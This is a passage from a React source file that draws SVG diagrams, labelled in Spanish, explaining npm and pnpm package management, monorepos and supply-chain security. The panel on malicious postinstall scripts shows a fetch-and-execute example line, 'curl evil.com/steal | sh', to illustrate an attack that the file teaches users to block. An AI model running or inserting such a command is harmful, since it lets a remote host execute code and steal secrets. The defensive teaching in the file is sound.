      <rect x="230" y="48" width="180" height="45" rx="6" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="320" y="65" fill="#818cf8" fontWeight="bold" fontSize="8.5" textAnchor="middle">Root Workspace</text>
      <text x="320" y="78" fill={textColor} fontSize="7" textAnchor="middle">workspaces: [&quot;packages/*&quot;, &quot;apps/*&quot;]</text>

      {/* Arrow down to internal libs */}
      <path d="M280 95 L160 115" stroke="#6366f1" strokeWidth="1.5" />
      <path d="M360 95 L480 115" stroke="#6366f1" strokeWidth="1.5" />

      {/* packages/ui */}
      <rect x="40" y="115" width="240" height="65" rx="6" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="160" y="132" fill="#34d399" fontWeight="bold" fontSize="8.5" textAnchor="middle">packages/ui (@acme/ui)</text>
      <text x="50" y="148" fill={textColor} fontSize="7">• Componentes compartidos de React</text>
      <text x="50" y="160" fill={textColor} fontSize="7">• Cero publicación a npm para probar cambios</text>

      {/* Link arrow */}
      <path d="M285 145 L355 145" stroke="#f59e0b" strokeWidth="2" strokeDasharray="3 3" />
      <text x="320" y="140" fill="#f59e0b" fontSize="7" fontWeight="bold" textAnchor="middle">Symlink Local</text>

      {/* apps/web */}
      <rect x="360" y="115" width="240" height="65" rx="6" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="480" y="132" fill="#fb923c" fontWeight="bold" fontSize="8.5" textAnchor="middle">apps/web (Next.js Application)</text>
      <text x="370" y="148" fill={textColor} fontSize="7">&quot;dependencies&quot;: &#123;</text>
      <text x="380" y="160" fill="#10b981" fontSize="7" fontWeight="bold">&quot;@acme/ui&quot;: &quot;workspace:*&quot;</text>
      <text x="370" y="172" fill={textColor} fontSize="7">&#125;</text>

      <rect x="25" y="190" width="590" height="18" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="202" fill={subtextColor} fontSize="7.5" textAnchor="middle">El protocolo &apos;workspace:*&apos; vincula código fuente en vivo; al publicar, el gestor lo reemplaza por la versión SemVer real.</text>
    </svg>
  );
  },

  "pkg-corepack-version-pinning": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Corepack &amp; El Campo &apos;packageManager&apos; en Node.js</text>

      {/* Developer input */}
      <rect x="30" y="55" width="160" height="120" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="110" y="75" fill="#818cf8" fontWeight="bold" fontSize="9.5" textAnchor="middle">Desarrollador / Terminal</text>
      <rect x="40" y="90" width="140" height="25" rx="3" fill={isDark ? "#312e81" : "#c7d2fe"} />
      <text x="110" y="106" fill="#e0e7ff" fontSize="8" fontFamily="monospace" textAnchor="middle">$ pnpm install</text>
      <text x="110" y="135" fill={textColor} fontSize="7" textAnchor="middle">Sin pnpm instalado globalmente</text>
      <text x="110" y="150" fill={subtextColor} fontSize="6.5" textAnchor="middle">Ejecuta el comando libremente</text>

      {/* Arrow */}
      <path d="M192 115 L230 115" stroke="#6366f1" strokeWidth="2" />
      <polygon points="232,115 225,111 225,119" fill="#6366f1" />

      {/* Corepack Bridge */}
      <rect x="235" y="50" width="170" height="130" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="2" />
      <text x="320" y="70" fill="#fb923c" fontWeight="bold" fontSize="10" textAnchor="middle">Corepack (Proxy en Node.js)</text>
      <text x="245" y="90" fill={textColor} fontSize="7.5">1. Lee package.json:</text>
      <rect x="245" y="98" width="150" height="28" rx="3" fill={isDark ? "#7c2d12" : "#fed7aa"} />
      <text x="250" y="110" fill="#7c2d12" fontSize="6.5" fontFamily="monospace">&quot;packageManager&quot;:</text>
      <text x="250" y="121" fill="#7c2d12" fontSize="6.5" fontFamily="monospace">&quot;pnpm@9.4.0&quot;</text>
      <text x="245" y="145" fill={textColor} fontSize="7">2. Descarga al vuelo v9.4.0</text>
      <text x="320" y="165" fill="#f97316" fontSize="7" fontWeight="bold" textAnchor="middle">Aislamiento por Proyecto</text>

      {/* Arrow */}
      <path d="M408 115 L445 115" stroke="#10b981" strokeWidth="2" />
      <polygon points="447,115 440,111 440,119" fill="#10b981" />

      {/* Result */}
      <rect x="450" y="55" width="160" height="120" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="530" y="75" fill="#34d399" fontWeight="bold" fontSize="9.5" textAnchor="middle">Resultado Garantizado</text>
      <text x="460" y="95" fill={textColor} fontSize="7.5">• Cero discrepancias en equipo</text>
      <text x="460" y="110" fill={textColor} fontSize="7.5">• Proyecto A corre pnpm v8</text>
      <text x="460" y="125" fill={textColor} fontSize="7.5">• Proyecto B corre pnpm v9</text>
      <text x="460" y="140" fill={textColor} fontSize="7.5">• En CI corre exactamente igual</text>
      <text x="530" y="160" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">100% Determinista</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Habilitar con &apos;corepack enable&apos;; elimina para siempre el error de que un dev instale dependencias con un gestor equivocado.</text>
    </svg>
  );
  },

  "pkg-overrides-resolutions-tree": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Overrides &amp; Resolutions: Parches de Seguridad en Dependencias Transitorias</text>

      {/* Dependency Tree with Vulnerability */}
      <rect x="25" y="50" width="280" height="135" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="165" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">Problema: Dependencia Abandonada</text>
      <text x="35" y="88" fill={textColor} fontSize="7.5">Tu Proyecto</text>
      <text x="50" y="101" fill={textColor} fontSize="7">└── legacy-analytics-sdk@1.0.0 (Sin updates en 3 años)</text>
      <text x="65" y="114" fill="#ef4444" fontSize="7">    └── axios@0.19.0 (🔥 CVE Crítico de Seguridad)</text>
      <text x="35" y="135" fill={textColor} fontSize="7.5">• El creador de la librería no responde</text>
      <text x="35" y="148" fill={textColor} fontSize="7.5">• El scanner de CI/CD bloquea el despliegue</text>
      <text x="165" y="172" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Vulnerabilidad de Bloqueo</text>

      {/* Solution: overrides / resolutions */}
      <rect x="335" y="50" width="280" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="475" y="68" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">Solución: &apos;overrides&apos; (npm/pnpm) / &apos;resolutions&apos; (yarn)</text>
      <rect x="345" y="80" width="260" height="42" rx="4" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="355" y="94" fill="#94a3b8" fontSize="7" fontFamily="monospace">&quot;pnpm&quot;: &#123; &quot;overrides&quot;: &#123;</text>
      <text x="365" y="106" fill="#34d399" fontSize="7" fontFamily="monospace">&quot;axios&quot;: &quot;&gt;=1.7.2&quot;</text>
      <text x="355" y="118" fill="#94a3b8" fontSize="7" fontFamily="monospace">&#125; &#125;</text>
      <text x="345" y="140" fill={textColor} fontSize="7.5">• Fuerza a TODO el árbol a usar la versión parcheada</text>
      <text x="345" y="153" fill={textColor} fontSize="7.5">• Desbloquea el CI sin hacer fork de la librería</text>
      <text x="475" y="172" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Resolución Inmediata</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Permite remediar vulnerabilidades transitorias graves sin esperar semanas a que un maintainer externo libere una versión.</text>
    </svg>
  );
  },

  "pkg-supply-chain-security-risks": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Seguridad en la Cadena de Suministro (Supply Chain Attacks)</text>

      {/* Attack 1: Typosquatting */}
      <rect x="25" y="50" width="185" height="135" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="117" y="68" fill="#ef4444" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Typosquatting</text>
      <text x="35" y="88" fill={textColor} fontSize="7.5">• Publicar paquetes con nombres</text>
      <text x="35" y="100" fill={textColor} fontSize="7.5">  casi idénticos a los populares</text>
      <text x="35" y="115" fill="#ef4444" fontSize="7" fontFamily="monospace">  npm i cross-env vs crossenv</text>
      <text x="35" y="130" fill={subtextColor} fontSize="7">• Roba tokens y credenciales AWS</text>
      <text x="117" y="168" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Explotación de Errores de Tipeo</text>

      {/* Attack 2: Dependency Confusion */}
      <rect x="228" y="50" width="185" height="135" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="320" y="68" fill="#fb923c" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Dependency Confusion</text>
      <text x="238" y="88" fill={textColor} fontSize="7.5">• Tu empresa usa &apos;acme-auth&apos; interno</text>
      <text x="238" y="100" fill={textColor} fontSize="7.5">• Un atacante publica &apos;acme-auth&apos;</text>
      <text x="238" y="112" fill={textColor} fontSize="7.5">  en npm público con v99.0.0</text>
      <text x="238" y="125" fill="#f97316" fontSize="7">• npm descarga la versión superior</text>
      <text x="320" y="168" fill="#f97316" fontSize="7" fontWeight="bold" textAnchor="middle">Solución: Paquetes con Scopes (@acme)</text>

      {/* Attack 3: Malicious Postinstall */}
      <rect x="430" y="50" width="185" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="522" y="68" fill="#818cf8" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Lifecycle Scripts Malware</text>
      <text x="440" y="88" fill={textColor} fontSize="7.5">• Scripts &quot;postinstall&quot; maliciosos</text>
      <text x="440" y="100" fill={textColor} fontSize="7.5">  ejecutados automáticamente al instalar</text>
      <text x="440" y="115" fill="#6366f1" fontSize="7" fontFamily="monospace">  curl evil.com/steal | sh</text>
      <text x="440" y="130" fill={textColor} fontSize="7.5">• Defensa: --ignore-scripts</text>
      <text x="522" y="168" fill="#6366f1" fontSize="7" fontWeight="bold" textAnchor="middle">Monitoreo con Socket.dev / Snyk</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Proteger repositorios corporativos requiere: Scoped packages (@org), 2FA obligatorio en npm y bloqueo de scripts de instalación.</text>
    </svg>
  );
  },

  "pkg-private-registry-npmrc": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Registries Privados &amp; Enrutamiento de Scopes vía .npmrc</text>

      {/* .npmrc Config Box */}
      <rect x="30" y="50" width="310" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="70" fill="#94a3b8" fontSize="7.5" fontFamily="monospace"># Archivo .npmrc en la raíz del proyecto</text>
      <text x="45" y="90" fill="#38bdf8" fontSize="7.5" fontFamily="monospace">@acme:registry=https://npm.pkg.github.com</text>
      <text x="45" y="105" fill="#34d399" fontSize="7" fontFamily="monospace">{"//"}npm.pkg.github.com/:_authToken={"${NPM_TOKEN}"}</text>
      <text x="45" y="130" fill="#94a3b8" fontSize="7.5" fontFamily="monospace"># Resto de paquetes al registry público oficial</text>
      <text x="45" y="145" fill="#f59e0b" fontSize="7.5" fontFamily="monospace">registry=https://registry.npmjs.org/</text>
      <text x="45" y="165" fill="#a5b4fc" fontSize="7" fontFamily="monospace">always-auth=true</text>

      {/* Right: Architecture flow */}
      <rect x="360" y="50" width="250" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="485" y="70" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">Enrutamiento Dual Inteligente</text>
      <text x="375" y="92" fill={textColor} fontSize="7.5">1. Paquetes con prefijo <tspan fontWeight="bold">@acme/*</tspan>:</text>
      <text x="375" y="105" fill={subtextColor} fontSize="7">  Enrutados a GitHub Packages o Verdaccio</text>
      <text x="375" y="117" fill={subtextColor} fontSize="7">  con autenticación segura de token.</text>
      <text x="375" y="135" fill={textColor} fontSize="7.5">2. Paquetes estándar (<tspan fontWeight="bold">react, lodash</tspan>):</text>
      <text x="375" y="148" fill={subtextColor} fontSize="7">  Descargados de registry.npmjs.org</text>
      <text x="485" y="172" fill="#10b981" fontSize="7.5" fontWeight="bold" textAnchor="middle">Aislamiento y Confidencialidad</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">NUNCA guardes tokens en texto plano en .npmrc; utiliza variables de entorno como {"${NPM_TOKEN}"} inyectadas por CI.</text>
    </svg>
  );
  },

  "pkg-modern-exports-map-dual": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">El Mapa de &apos;exports&apos; Moderno &amp; Paquetes Duales (ESM + CJS)</text>

      {/* package.json exports */}
      <rect x="30" y="50" width="310" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="68" fill="#94a3b8" fontSize="7.5" fontFamily="monospace">&quot;exports&quot;: &#123;</text>
      <text x="55" y="82" fill="#f59e0b" fontSize="7.5" fontFamily="monospace">&quot;.&quot;: &#123;</text>
      <text x="65" y="96" fill="#34d399" fontSize="7" fontFamily="monospace">&quot;types&quot;: &quot;./dist/index.d.ts&quot;,</text>
      <text x="65" y="110" fill="#38bdf8" fontSize="7" fontFamily="monospace">&quot;import&quot;: &quot;./dist/index.mjs&quot;,  // ESM</text>
      <text x="65" y="124" fill="#a5b4fc" fontSize="7" fontFamily="monospace">&quot;require&quot;: &quot;./dist/index.cjs&quot; // CommonJS</text>
      <text x="55" y="138" fill="#f59e0b" fontSize="7.5" fontFamily="monospace">&#125;,</text>
      <text x="55" y="152" fill="#ef4444" fontSize="7" fontFamily="monospace">&quot;./button&quot;: &quot;./dist/button.js&quot;</text>
      <text x="45" y="166" fill="#94a3b8" fontSize="7.5" fontFamily="monospace">&#125;</text>

      {/* Right: Benefits & Hazard */}
      <rect x="360" y="50" width="250" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="485" y="68" fill="#818cf8" fontWeight="bold" fontSize="10" textAnchor="middle">Ventajas del Exports Map</text>
      <text x="375" y="88" fill={textColor} fontSize="7.5">• Encapsulación estricta de código interno</text>
      <text x="375" y="100" fill={subtextColor} fontSize="6.5">  (Impide importar archivos privados como /src/internal)</text>
      <text x="375" y="115" fill={textColor} fontSize="7.5">• Soporte Dual: import en Vite y require en Jest</text>
      <text x="375" y="130" fill="#ef4444" fontSize="7.5" fontWeight="bold">Evita el &quot;Dual Package Hazard&quot;:</text>
      <text x="375" y="142" fill={subtextColor} fontSize="6.5">  Garantiza que singletons no se dupliquen</text>
      <text x="375" y="154" fill={subtextColor} fontSize="6.5">  si un consumidor mezcla import y require</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">La propiedad &apos;types&apos; SIEMPRE debe ser la primera clave dentro de &apos;exports&apos; para que TypeScript la reconozca.</text>
    </svg>
  );
  },

  "pkg-changesets-monorepo-release": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Automatización de Releases en Monorepos con Changesets</text>

      {/* Step 1 */}
      <rect x="25" y="55" width="165" height="115" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="107" y="75" fill="#818cf8" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Declarar Cambio (PR)</text>
      <text x="35" y="95" fill={textColor} fontSize="7.5">• Dev corre $ pnpm changeset</text>
      <text x="35" y="110" fill={textColor} fontSize="7.5">• Selecciona paquete modificado</text>
      <text x="35" y="125" fill={textColor} fontSize="7.5">• Elige tipo: minor | patch | major</text>
      <text x="107" y="152" fill="#6366f1" fontSize="7" fontWeight="bold" textAnchor="middle">Crea archivo .changeset/md</text>

      {/* Arrow 1 */}
      <path d="M198 112 L228 112" stroke="#6366f1" strokeWidth="2" />
      <polygon points="230,112 223,108 223,116" fill="#6366f1" />

      {/* Step 2 */}
      <rect x="235" y="55" width="170" height="115" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="320" y="75" fill="#fb923c" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Pull Request de Release</text>
      <text x="245" y="95" fill={textColor} fontSize="7.5">• El bot de GitHub agrupa</text>
      <text x="245" y="110" fill={textColor} fontSize="7.5">  todos los changesets en main</text>
      <text x="245" y="125" fill={textColor} fontSize="7.5">• Actualiza CHANGELOG.md</text>
      <text x="320" y="152" fill="#f97316" fontSize="7" fontWeight="bold" textAnchor="middle">PR automático &quot;Version Packages&quot;</text>

      {/* Arrow 2 */}
      <path d="M408 112 L438 112" stroke="#10b981" strokeWidth="2" />
      <polygon points="440,112 433,108 433,116" fill="#10b981" />

      {/* Step 3 */}
      <rect x="445" y="55" width="165" height="115" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="527" y="75" fill="#34d399" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Publicación a Registry</text>
      <text x="455" y="95" fill={textColor} fontSize="7.5">• Al fusionar el Release PR:</text>
      <text x="455" y="110" fill={textColor} fontSize="7.5">• Dispara pnpm changeset publish</text>
      <text x="455" y="125" fill={textColor} fontSize="7.5">• Publica tags Git y en npm</text>
      <text x="527" y="152" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">0 Fricción en Monorepos</text>

      <rect x="25" y="180" width="590" height="25" rx="4" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="196" fill={subtextColor} fontSize="7.5" textAnchor="middle">Changesets es el estándar moderno en monorepos (usado por Next.js, TanStack y Vite) para versionado independiente por paquete.</text>
    </svg>
  );
  },

  "pkg-ci-caching-pnpm-store": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Estrategia de Caché de Alto Rendimiento en CI/CD</text>

      {/* Bad Practice */}
      <rect x="25" y="48" width="280" height="140" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="165" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">❌ Antipatrón: Cachear /node_modules</text>
      <text x="35" y="90" fill={textColor} fontSize="7.5">• Miles de archivos pequeños rompen el tarball del CI</text>
      <text x="35" y="105" fill={textColor} fontSize="7.5">• Rompe symlinks y permisos de ejecución binaria</text>
      <text x="35" y="120" fill={textColor} fontSize="7.5">• Subir y bajar la caché tarda más que instalar</text>
      <text x="35" y="135" fill={textColor} fontSize="7.5">• Acumula artefactos corruptos de builds pasados</text>
      <text x="165" y="172" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Lento, Frágil y Pesado (&gt;1.5 GB)</text>

      {/* Best Practice */}
      <rect x="335" y="48" width="280" height="140" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="475" y="68" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">✅ Mejor Práctica: Cachear el Store Global de PNPM</text>
      <text x="345" y="90" fill={textColor} fontSize="7.5">• Cachear la ruta: $(pnpm store path)</text>
      <text x="345" y="105" fill={textColor} fontSize="7.5">• Almacén inmutable indexado por hash</text>
      <text x="345" y="120" fill={textColor} fontSize="7.5">• PNPM enlaza por hard links en 2 segundos</text>
      <text x="345" y="135" fill={textColor} fontSize="7.5">• actions/setup-node con cache: &apos;pnpm&apos;</text>
      <text x="475" y="172" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Instalaciones de CI en &lt; 10 segundos</text>

      <rect x="25" y="195" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="205" fill={subtextColor} fontSize="7.5" textAnchor="middle">Cachear el almacén inmutable permite recrear un node_modules impecable en segundos sin riesgo de corrupción.</text>
    </svg>
  );
  },

  "pkg-lifecycle-scripts-execution": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Cadena de Scripts de Ciclo de Vida y Defensa con --ignore-scripts</text>

      {/* Execution Sequence */}
      <g transform="translate(30, 50)">
        {/* Step 1 */}
        <rect x="0" y="0" width="125" height="85" rx="6" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" />
        <text x="62" y="20" fill="#818cf8" fontWeight="bold" fontSize="8.5" textAnchor="middle">1. preinstall</text>
        <text x="10" y="40" fill={textColor} fontSize="6.5">• Verificación de motor</text>
        <text x="10" y="52" fill={textColor} fontSize="6.5">• Chequeo de SO/Arquitectura</text>
        <text x="10" y="64" fill={subtextColor} fontSize="6">• Corre antes de descargar</text>

        <path d="M127 42 L148 42" stroke="#6366f1" strokeWidth="2" />

        {/* Step 2 */}
        <rect x="150" y="0" width="125" height="85" rx="6" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" />
        <text x="212" y="20" fill="#34d399" fontWeight="bold" fontSize="8.5" textAnchor="middle">2. install / compile</text>
        <text x="160" y="40" fill={textColor} fontSize="6.5">• Descarga de tarballs</text>
        <text x="160" y="52" fill={textColor} fontSize="6.5">• Compilación C++ (node-gyp)</text>
        <text x="160" y="64" fill={subtextColor} fontSize="6">• Creación de symlinks</text>

        <path d="M277 42 L298 42" stroke="#10b981" strokeWidth="2" />

        {/* Step 3 */}
        <rect x="300" y="0" width="130" height="85" rx="6" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" />
        <text x="365" y="20" fill="#fb923c" fontWeight="bold" fontSize="8.5" textAnchor="middle">3. postinstall</text>
        <text x="310" y="40" fill={textColor} fontSize="6.5">• Generación Prisma client</text>
        <text x="310" y="52" fill={textColor} fontSize="6.5">• Descarga binarios esbuild</text>
        <text x="310" y="64" fill="#ef4444" fontSize="6.5" fontWeight="bold">• ⚠️ Vector de malware común</text>

        <path d="M432 42 L453 42" stroke="#f97316" strokeWidth="2" />

        {/* Step 4 */}
        <rect x="455" y="0" width="125" height="85" rx="6" fill={isDark ? "#3b0764" : "#faf5ff"} stroke="#a855f7" />
        <text x="517" y="20" fill="#c084fc" fontWeight="bold" fontSize="8.5" textAnchor="middle">4. prepare</text>
        <text x="465" y="40" fill={textColor} fontSize="6.5">• Corre tras install local</text>
        <text x="465" y="52" fill={textColor} fontSize="6.5">• Instalación de Husky</text>
        <text x="465" y="64" fill={subtextColor} fontSize="6">• No corre en prod/CI</text>
      </g>

      {/* Defense Box */}
      <rect x="30" y="145" width="580" height="42" rx="6" fill={isDark ? "#0f172a" : "#f1f5f9"} stroke="#94a3b8" />
      <text x="45" y="162" fill="#ef4444" fontWeight="bold" fontSize="8">Defensa Empresarial: pnpm install --ignore-scripts</text>
      <text x="45" y="177" fill={textColor} fontSize="7">Bloquea la ejecución arbitraria de scripts postinstall de terceros; solo autoriza explícitamente paquetes como esbuild o prisma.</text>

      <rect x="25" y="195" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="205" fill={subtextColor} fontSize="7.5" textAnchor="middle">En entornos sensibles de CI, usar --ignore-scripts previene ataques de ejecución remota de código en dependencias.</text>
    </svg>
  );
  },

  "pkg-depcheck-knip-dead-deps": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Higiene de Repositorio: Detección Forense con Knip &amp; Depcheck</text>

      {/* Knip Terminal Output */}
      <rect x="30" y="50" width="330" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="70" fill="#94a3b8" fontSize="8" fontFamily="monospace">$ pnpm knip</text>
      <text x="45" y="90" fill="#ef4444" fontSize="7.5" fontFamily="monospace">Unused dependencies (2)</text>
      <text x="55" y="105" fill="#f87171" fontSize="7" fontFamily="monospace">lodash        package.json (reemplazado por nativo)</text>
      <text x="55" y="118" fill="#f87171" fontSize="7" fontFamily="monospace">moment        package.json (reemplazado por date-fns)</text>
      <text x="45" y="135" fill="#f59e0b" fontSize="7.5" fontFamily="monospace">Unlisted dependencies (1)</text>
      <text x="55" y="148" fill="#fb923c" fontSize="7" fontFamily="monospace">clsx          src/components/Card.tsx (¡Falta en package.json!)</text>
      <text x="45" y="168" fill="#34d399" fontSize="7" fontFamily="monospace">Unused exports (4) en src/utils/format.ts</text>

      {/* Benefits box */}
      <rect x="380" y="50" width="230" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="495" y="70" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">Auditoría Estática de AST</text>
      <text x="395" y="92" fill={textColor} fontSize="7.5">• Analiza el árbol de código real (imports)</text>
      <text x="395" y="107" fill={textColor} fontSize="7.5">• Reduce el bundle size eliminando peso muerto</text>
      <text x="395" y="122" fill={textColor} fontSize="7.5">• Detecta dependencias fantasma antes del CI</text>
      <text x="395" y="137" fill={textColor} fontSize="7.5">• Encuentra exports de TS que nadie consume</text>
      <text x="495" y="165" fill="#10b981" fontSize="8" fontWeight="bold" textAnchor="middle">Pipeline Limpio y Ligero</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Knip analiza código TypeScript, configs de frameworks y dependencias en un solo comando unificado.</text>
    </svg>
  );
  },

  "pkg-yarn-pnp-plug-and-play": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Yarn Berry Plug&apos;n&apos;Play (PnP): Erradicando node_modules</text>

      {/* Traditional Node Modules */}
      <rect x="25" y="50" width="280" height="135" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
